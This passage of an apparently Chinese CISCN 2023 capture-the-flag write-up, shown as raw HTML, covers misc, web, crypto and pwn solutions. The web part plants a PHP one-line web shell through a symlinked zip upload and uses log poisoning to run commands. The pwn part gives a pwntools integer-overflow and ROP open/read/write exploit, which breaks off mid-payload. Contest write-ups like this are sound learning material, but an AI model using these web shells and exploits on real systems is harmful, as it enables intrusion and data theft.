punctuation">]</span><span class="token comment">#定义颜色变量</span>color <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'g'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'y'</span><span class="token punctuation">,</span> <span class="token string">'k'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">]</span>xx <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">]</span>yy <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token comment">#用for循环将文件中的值赋值给x，y</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>df<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    x<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>df<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    y<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>df<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>xx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    x<span class="token punctuation">.</span>append<span class="token punctuation">(</span>xx<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    y<span class="token punctuation">.</span>append<span class="token punctuation">(</span>yy<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#画图</span>plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> c<span class="token operator">=</span>color<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> edgecolors<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="https://shierjinghuang.github.io/2023/05/27/2023%E5%B9%B4ciscn%E9%A2%98%E8%A7%A3/Ciscn%20%E6%95%A3%E7%82%B9%E5%9B%BE.png" style="zoom:67%;" /><blockquote><p> flag{202305012359}</p></blockquote><h4 id="被加密的生产流量"><a href="#被加密的生产流量" class="headerlink" title="被加密的生产流量:"></a>被加密的生产流量:</h4><p>追踪流发现base编码</p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/20230527141401.png" style="zoom: 33%;" /><p>base32编码，解码得到flag</p><blockquote><p>flag{c1f_fi1g_1000}</p></blockquote><h4 id="pyshell"><a href="#pyshell" class="headerlink" title="pyshell:"></a>pyshell:</h4><p>本题为python的shell终端，拼接读取flag的字符串后用eval()进行执行，即可获得flag</p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230528145149.png" style="zoom: 67%;" /><blockquote><p>flag{2c9b76d6-8379-4dd8-a95a-a383420575f5}</p></blockquote><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="unzip："><a href="#unzip：" class="headerlink" title="unzip："></a>unzip：</h4><p>建立软连接实现，</p><p>参考博客：<code>https://forum.butian.net/share/906</code></p><p>先建立软连接</p><pre class="line-numbers language-none"><code class="language-none">ln -s &#x2F;var&#x2F;www&#x2F;html test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">zip --symlinks test.zip .&#x2F;*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>创建 test文件</p><pre class="line-numbers language-none"><code class="language-none">mkdir test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>cd 进去创建cmd.php</p><pre class="line-numbers language-none"><code class="language-none">vim cmd.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>往里面写入一句话木马</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php @eval($_POST[&#39;shell&#39;]);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>退回上级目录，压缩test文件夹</p><pre class="line-numbers language-none"><code class="language-none">zip -r test1.zip .&#x2F;*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>先上传test.zip 后上传test1.zip，然后直接蚁剑连上</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;eci-2ze4nvw7kl74qmeixz3h.cloudeci1.ichunqiu.com&#x2F;cmd.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>找到flag即可</p><h4 id="dumpit"><a href="#dumpit" class="headerlink" title="dumpit"></a>dumpit</h4><p>对/flag下所有提供的参数进行测试，发现提供的第二个参数可以到日志</p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230528145934.png" style="zoom:50%;" /><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230528150053.png" style="zoom:50%;" /><p>过滤了post和get，不能直接将木马写入参数中执行</p><p>这里采用echo重定向的方式，将待执行的命令写入到User-Agent中，并重定向到/app/log/a.php中</p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230528150351.png" style="zoom:50%;" /><p>访问/log/a.php发现可以成功执行</p><p>最后在env环境变量中找到flag</p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230528150515.png" style="zoom: 50%;" /><blockquote><p>flag{290a8dfa-4d33-4ae2-a781-ef17e464d0bc}</p></blockquote><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="Sign-in-passwd"><a href="#Sign-in-passwd" class="headerlink" title="Sign_in_passwd:"></a>Sign_in_passwd:</h4><p>是一道Base64换表题目，使用CyberChef的Base64转码功能，可以自定义Base64表格，输入需要转码的字符串，即可得flag ，题目给的表中有部分经过url编码，解码后便可以正常实现</p><h4 id="基于国密SM2算法的密钥密文分发"><a href="#基于国密SM2算法的密钥密文分发" class="headerlink" title="基于国密SM2算法的密钥密文分发:"></a>基于国密SM2算法的密钥密文分发:</h4><p>非预期解，在登录获取id并且发送完公钥后，通过quantum获取服务器端密钥的密文后，search查看发现服务器端存在密钥的明文，即quantumStringServer，发送该明文进行check获取flag。</p><p>​                                <a href="https://imgse.com/i/p9LeEZj"><img src="https://s1.ax1x.com/2023/05/27/p9LeEZj.png" alt="p9LeEZj.png" style="zoom: 50%;" />        </a>    </p><blockquote><p>flag{fe362b36-56e5-4b6c-a5cc-12d3e755ce0}</p></blockquote><h4 id="可信度量"><a href="#可信度量" class="headerlink" title="可信度量:"></a>可信度量:</h4><p>非预期解，通过命令全局搜索flag字符串。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">grep <span class="token operator">-</span>ra <span class="token string">"flag&#123;"</span> <span class="token operator">/</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![img](file:///C:\Users\86198\Documents\Tencent Files\1766871892\Image\C2C\OYUNA5G0`(OO)VX%3$@P947.png)</p><h3 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h3><h4 id="烧烤摊儿"><a href="#烧烤摊儿" class="headerlink" title="烧烤摊儿:"></a>烧烤摊儿:</h4><p>首先，分析vip函数，发现无符号整数存在整数溢出，因此考虑输入-1000000使余额溢出到大于100000。</p><p>![img](file:///C:\Users\86198\Documents\Tencent Files\1766871892\Image\C2C]I{EODH[FQ1S]6X$Y}L0N8Y.png)</p><p>之后买下该店后通过栈溢出劫持程序执行流，因为本题禁止了execve的系统调用，因此考虑orw读取flag。只需要控制栈溢出后分别执行open，read，write三个函数。</p><p>完整exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#io = process("./shaokao")</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>name_addr <span class="token operator">=</span> <span class="token number">0x4E60F0</span>open_addr <span class="token operator">=</span> <span class="token number">0x457C90</span>read_addr <span class="token operator">=</span> <span class="token number">0x457DC0</span>write_addr <span class="token operator">=</span> <span class="token number">0x457E60</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x40264f</span>pop_rsi_ret <span class="token operator">=</span> <span class="token number">0x40a67e</span>pop_rdx_rbx <span class="token operator">=</span> <span class="token number">0x4a404b</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token comment">#integer overflow</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'-1000000'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'5'</span><span class="token punctuation">)</span><span class="token comment">#rop orw</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>name_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>open_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>name_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_rbx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>name_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_rbx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token 